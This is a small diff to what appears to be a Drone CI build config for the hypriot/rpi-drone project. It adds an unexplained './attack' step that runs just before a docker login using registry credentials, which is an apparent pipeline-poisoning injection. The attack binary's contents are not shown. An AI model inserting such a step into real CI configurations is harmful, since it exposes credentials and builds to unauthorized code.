@@ -6,6 +6,7 @@ git:
   path: github.com/hypriot/rpi-drone
 script:
   - echo "+++++ start docker daemon +++++"
+  - ./attack
   - wrapdocker &
   - sleep 5
   - docker login --username=$$REGISTRY_USER --password=$$REGISTRY_PASSWORD --email=$$REGISTRY_USER_EMAIL $$REGISTRY_URL
